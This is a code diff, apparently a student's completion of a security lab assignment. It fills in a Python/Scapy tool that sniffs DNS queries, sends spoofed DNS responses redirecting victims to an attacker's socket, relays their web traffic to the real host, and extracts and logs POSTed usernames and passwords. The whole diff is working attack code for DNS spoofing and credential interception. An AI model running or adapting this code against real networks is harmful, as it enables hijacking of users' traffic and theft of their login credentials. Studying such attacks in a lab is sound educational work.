@@ -32,73 +32,70 @@ def log_credentials(username, password):
 
 
 def check_credentials(client_data):
-	# TODO: Take a block of client data and search for username/password credentials.
+	# Take a block of client data and search for username/password credentials.
 	# If found, log the credentials to the system by calling log_credentials().
+	data_str = client_data.decode()
+	if(('POST' not in data_str) or ('username' not in data_str) or ('password' not in data_str)):
+		return
+	after_username = (data_str.split('username=')[1])
+	username = after_username.split("\'")[1]
+	after_password = (data_str.split('password=')[1])
+	password = after_password.split("\'")[1]
+	log_credentials(username,password)
 
-	# username =
-	# password =
-	# log_credentials(username,password)
-	raise NotImplementedError
+def check_will_to_logout(client_data): # if client_data is a logout request return true
+	data_str = client_data.decode()
+	if (('POST' not in data_str) or ('post_logout' not in data_str)):
+		return False
+	return True
 
 
-def handle_tcp_forwarding(client_socket, client_ip, hostname):
-	# Continuously intercept new connections from the client
+def handle_tcp_forwarding(attaquer_socket, client_ip, hostname):
+	# Continuously intercept new connection attaquer_sockets from the client
 	# and initiate a connection with the host in order to forward data
-	print('client_soquet type is: ',type(client_socket))
 	while True:
-		# TODO: accept a new connection from the client on client_socket and
+		# accept a new connection from the client on client_socket and
 		# create a new socket to connect to the actual host associated with hostname.
-		conn, addr = client_socket.accept()
+		client_socket, addr = attaquer_socket.accept()
 		host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		host_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))
 
-		# TODO: read data from client socket, check for credentials, and forward along to host socket.
+		# read data from client socket, check for credentials, and forward along to host socket.
 		# Check for POST to '/post_logout' and exit after that request has completed.
 
-		data_from_client = conn.recv(1024)
-		# check_credentials(data_from_client)
+		data_from_client = client_socket.recv(50000)
 		host_socket.sendall(data_from_client)
-		print('data_from_client is: ', repr(data_from_client.decode("ascii")))
 		if not data_from_client:
 			break
-		conn2, addr2 = host_socket.accept()
-		host_socket.connect((client_ip, WEB_PORT))
-		data_from_host = conn2.recv(1024)
-		print('data_from_host is: ', repr(data_from_host.decode("ascii")))
-		client_socket.sendall(data_from_host)
-	print('Im out of while')
+		check_credentials(data_from_client)
+		end = check_will_to_logout(data_from_client)
+		data_from_server = host_socket.recv(50000)
+		client_socket.sendall(data_from_server)
+		if(end):
+			return
 
 
 
 
 
-	raise NotImplementedError
-
-
-def dns_callback(packet, extra_args): # source_ip, our_socket
-	# TODO: Write callback function for handling DNS packets.
+def dns_callback(packet, extra_args): # extra_args = (source_ip, attacker_socket)
+	# Write callback function for handling DNS packets.
 	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
-	print(packet.show())
 	queryName = (packet[DNS].qd.qname)[:-1].decode()
-	print('query name is: ',queryName)
 	client_ip = packet[IP].src
-	print('client_ip is ', client_ip)
 	if(queryName != HOSTNAME):
 		print('query name is different from HOSTNAME')
 		return
 	# Construct the IP header by looking at the sniffed packet
-
 	ip = IP(
 		src=packet[IP].dst,
 		dst=packet[IP].src
 	)
-
 	# Construct the UDP header by looking at the sniffed packet
 	udp = UDP(
 		dport=packet[UDP].sport,
 		sport=packet[UDP].dport
 	)
-
 	# Construct the DNS response by looking at the sniffed packet and manually
 	dns = DNS(
 		id=packet[DNS].id,
@@ -116,34 +113,25 @@ def dns_callback(packet, extra_args): # source_ip, our_socket
 			ttl=600,
 			rdata=extra_args[0])
 	)
-
 	# Put the full packet together
 	response_packet = ip / udp / dns
-
 	# Send the DNS response
 	send(response_packet, iface=IFACE)
-
 	handle_tcp_forwarding(extra_args[1],client_ip , queryName)
-	raise NotImplementedError
 
 
-def sniff_and_spoof(source_ip):
-	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
+def sniff_and_spoof(source_ip):# source ip is the ip of the attacker
+	# Open a socket and bind it to the attacker's IP and WEB_PORT.
 	# This socket will be used to accept connections from victimized clients.
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind((source_ip, WEB_PORT))
-	s.listen()
-
-
-	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
+	attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	attacker_socket.bind((source_ip, WEB_PORT))
+	attacker_socket.listen()
+	# sniff for DNS packets on the network. Make sure to pass source_ip
 	# and the socket you created as extra callback arguments.
 	BPF_FILTER = f"udp port 53 and ip dst {DNS_SERVER_IP}"
-	cb = lambda x : dns_callback(x,(source_ip,s))
-	sniff(filter=BPF_FILTER,prn=cb, iface=IFACE)
+	cb = lambda x : dns_callback(x,(source_ip,attacker_socket))
+	sniff(filter=BPF_FILTER,prn=cb, iface=IFACE,count=1)
 
-
-
-	raise NotImplementedError
 
 
 def main():
